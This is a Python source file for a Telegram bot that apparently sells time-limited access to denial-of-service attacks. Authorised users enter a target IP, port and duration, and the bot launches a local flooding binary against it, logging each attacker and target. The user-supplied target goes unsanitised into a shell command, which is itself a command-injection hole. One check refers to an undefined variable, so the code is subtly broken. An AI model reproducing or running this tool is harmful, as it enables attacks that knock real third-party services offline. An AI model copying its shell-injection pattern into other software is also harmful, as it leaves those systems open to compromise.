import os
import time
import json
import pytz
import telebot
import datetime
import threading
import subprocess
from telebot import types

with open("config.json", "r") as info_file:
    info = json.load(info_file)

BOT_TOKEN = info["bot_token"]
admin_id = set(info["admin_ids"])
COOLDOWN_PERIOD = info.get("attack_cooldown")
bot = telebot.TeleBot(BOT_TOKEN)

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"

# Load user data from users.json
def load_users():
    if not os.path.exists(USER_FILE):
        return {}
    with open(USER_FILE, "r") as file:
        return json.load(file)

# Save user data to users.json
def save_users(users):
    with open(USER_FILE, "w") as file:
        json.dump(users, file, indent=4)

# Load existing users
users = load_users()

# Indian Standard Time (IST)
IST = pytz.timezone("Asia/Kolkata")

def log_command(user_id, target, port, duration):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"{user_id}"

    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {duration}\n\n")

# Function to check if user is authorized
def get_user_status(user_id):
    user_id = str(user_id)
    if user_id in users:
        expiry_time_str = users[user_id]["expiry"]
        expiry_time = datetime.datetime.strptime(expiry_time_str, "%Y-%m-%d %H:%M:%S")
        expiry_time = IST.localize(expiry_time)  # Ensure timezone is applied
        
        if datetime.datetime.now(IST) < expiry_time:
            return expiry_time.strftime("%Y-%m-%d %H:%M:%S")
    
    return "𝗘𝘅𝗽𝗶𝗿𝗲𝗱 ⛔️"

# Store last attack time
last_attack_time = {}

@bot.message_handler(commands=['add'])
def add_user(message):
    """Admin command to add a user for a specific duration (hours/days)."""
    user_id = str(message.chat.id)
    
    if user_id not in admin_id:
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗱𝗲𝗻𝗶𝗲𝗱!")
        return

    try:
        _, target_id, duration, unit = message.text.split()
        target_id = str(target_id)
        duration = int(duration)

        if unit not in ["hours", "days"]:
            bot.reply_to(message, "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝘁𝗶𝗺𝗲 𝘂𝗻𝗶𝘁. 𝗨𝘀𝗲 `𝗵𝗼𝘂𝗿𝘀` 𝗼𝗿 `𝗱𝗮𝘆𝘀`", parse_mode='Markdown')
            return
        
        # Calculate expiry time in IST
        current_time = datetime.datetime.now(IST)
        if unit == "days":
            expiry_time = current_time + datetime.timedelta(days=duration)
        else:
            expiry_time = current_time + datetime.timedelta(hours=duration)

        users[target_id] = {"expiry": expiry_time.strftime("%Y-%m-%d %H:%M:%S")}
        save_users(users)

        response = (f"✅ 𝗨𝘀𝗲𝗿 `{target_id}` 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗮𝗱𝗱𝗲𝗱 𝗳𝗼𝗿 `{duration} {unit}`\n"
                    f"𝗘𝘅𝗽𝗶𝗿𝘆: {expiry_time.strftime('%Y-%m-%d %H:%M:%S')}")
        bot.reply_to(message, response, parse_mode='Markdown')

    except ValueError:
        bot.reply_to(message, "𝗨𝘀𝗲: `/add <user_id> <duration> <hours/days>`", parse_mode='Markdown')

@bot.message_handler(commands=['remove'])
def remove_user(message):
    """Admin command to remove a user."""
    user_id = str(message.chat.id)

    if user_id not in admin_id:
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗱𝗲𝗻𝗶𝗲𝗱!")
        return

    try:
        _, target_id = message.text.split()
        target_id = str(target_id)

        if target_id in users:
            del users[target_id]
            save_users(users)
            bot.reply_to(message, f"𝗨𝘀𝗲𝗿 `{target_id}` 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝗲𝗺𝗼𝘃𝗲𝗱 👍", parse_mode='Markdown')
        else:
            bot.reply_to(message, "𝗨𝘀𝗲𝗿 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱")

    except ValueError:
        bot.reply_to(message, "𝗨𝘀𝗲: `/remove <user_id>`.", parse_mode='Markdown')

@bot.message_handler(commands=['users'])
def all_users(message):
    """Admin command to list all added users."""
    user_id = str(message.chat.id)

    if user_id not in admin_id:
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗱𝗲𝗻𝗶𝗲𝗱!")
        return

    if not users:
        bot.reply_to(message, "𝗡𝗼 𝘂𝘀𝗲𝗿𝘀 𝗳𝗼𝘂𝗻𝗱")
        return

    response = "👥 𝗔𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗨𝘀𝗲𝗿𝘀:\n\n"
    for uid in users.keys():
        expiry_status = get_user_status(uid)
        response += f"𝗨𝘀𝗲𝗿: `{uid}`\n𝗔𝗰𝗰𝗲𝘀𝘀: {expiry_status}\n\n"

    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "🚀 Attack")
def handle_attack(message):
    """Handles attack command with cooldown and authorization check."""
    user_id = str(message.chat.id)

    # Check if user is authorized
    if get_user_status(user_id) == "𝗘𝘅𝗽𝗶𝗿𝗲𝗱 ⛔️":
        bot.reply_to(message, "⛔️ 𝗨𝗻𝗮𝘂𝘁𝗼𝗿𝗶𝘀𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀! ⛔️\n\nOops! It seems like you don't have permission to use the Attack command. To gain access and unleash the power of attacks, you can:\n\n👉 Contact an Admin or the Owner for approval.\n🌟 If your access got expired then contact admin to renew.\n💬 Chat with an admin now and level up your experience!\n\nLet's get you the access you need!")
        return

    # Cooldown check
    if user_id in last_attack_time:
        time_since_last_attack = (datetime.datetime.now() - last_attack_time[user_id]).total_seconds()
        if time_since_last_attack < COOLDOWN_PERIOD:
            remaining_cooldown = COOLDOWN_PERIOD - time_since_last_attack
            bot.reply_to(message, f"⌛ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗮𝗰𝘁𝗶𝘃𝗲. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 {int(remaining_cooldown)} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀")
            return

    bot.reply_to(message, "𝗘𝗻𝘁𝗲𝗿 𝘁𝗮𝗿𝗴𝗲𝘁 𝗜𝗣, 𝗽𝗼𝗿𝘁, 𝗮𝗻𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝘀𝗲𝗽𝗮𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝘀𝗽𝗮𝗰𝗲𝘀")
    bot.register_next_step_handler(message, process_attack_details)

def process_attack_details(message):
    """Processes attack details and executes the attack."""
    user_id = str(message.chat.id)
    
    details = message.text.split()
    if len(details) != 3:
        bot.reply_to(message, "❕𝗨𝘀𝗲: `<IP> <Port> <Duration>`", parse_mode='Markdown')
        return
    
    target, port, duration = details
    try:
        port = int(port)
        duration = int(duration)
        
        if user_id not in admin_ids:
            if duration > 240:
                bot.reply_to(message, "❕𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗺𝘂𝘀𝘁 𝗯𝗲 𝗹𝗲𝘀𝘀 𝘁𝗵𝗮𝗻 240 𝘀𝗲𝗰𝗼𝗻𝗱𝘀")
                return
        
        # Execute attack command (Modify as needed)
        log_command(user_id, target, port, duration)
        full_command = f"./megoxer {target} {port} {duration} 9 900"
        subprocess.Popen(full_command, shell=True)

        # Notify user
        username = message.chat.username or "No username"
        response = (f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n"
                    f"𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n"
                    f"𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: `{duration}` 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n"
                    f"𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿: @{username}")
                    
        bot.reply_to(message, response, parse_mode='Markdown')

        # Set cooldown
        last_attack_time[user_id] = datetime.datetime.now()

        # Schedule attack completion message
        threading.Timer(duration, send_attack_finished_message, [message.chat.id]).start()

    except ValueError:
        bot.reply_to(message, "❗️𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗽𝗼𝗿𝘁 𝗼𝗿 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻")

def send_attack_finished_message(chat_id):
    """Notify user when the attack is finished."""
    bot.send_message(chat_id, "✅ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱!")

@bot.message_handler(commands=['start'])
def start_command(message):
    """Start command to display the main menu."""
    markup = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    attack_button = types.KeyboardButton("🚀 Attack")
    myinfo_button = types.KeyboardButton("👤 My Info")
    markup.add(attack_button, myinfo_button)
    bot.reply_to(message, "𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗺𝗲𝗴𝗼𝘅𝗲𝗿 𝗯𝗼𝘁!", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "👤 My Info")
def my_info(message):
    """Displays user information based on their access status."""
    user_id = str(message.chat.id)
    username = message.chat.username or "No username"
    role = "𝗔𝗱𝗺𝗶𝗻" if user_id in admin_id else "𝗨𝘀𝗲𝗿"
    
    # Check user access
    if user_id not in users:
        expiry_status = "𝗡𝗼𝘁 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱"
    else:
        expiry_time_str = users[user_id]["expiry"]
        expiry_time = datetime.datetime.strptime(expiry_time_str, "%Y-%m-%d %H:%M:%S")
        expiry_time = IST.localize(expiry_time)  # Ensure timezone is applied

        # Check if the expiration time has passed
        if datetime.datetime.now(IST) < expiry_time:
            expiry_status = f"{expiry_time.strftime('%Y-%m-%d %H:%M:%S')}"
        else:
            expiry_status = "𝗘𝘅𝗽𝗶𝗿𝗲𝗱 ⛔️"

    response = (f"👤 𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 👤\n\n"
                f"🔖 𝗥𝗼𝗹𝗲: {role}\n"
                f"ℹ️ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: @{username}\n"
                f"🆔 𝗨𝘀𝗲𝗿𝗜𝗗: `{user_id}`\n"
                f"⏳ 𝗔𝗰𝗰𝗲𝘀𝘀: `{expiry_status}`")

    bot.reply_to(message, response, parse_mode='Markdown')
    
@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱"
                bot.reply_to(message, response)
        else:
            response = "𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱"
            bot.reply_to(message, response)
    else:
        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱!"
        bot.reply_to(message, response)

if __name__ == "__main__":
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(e)
            time.sleep(3)
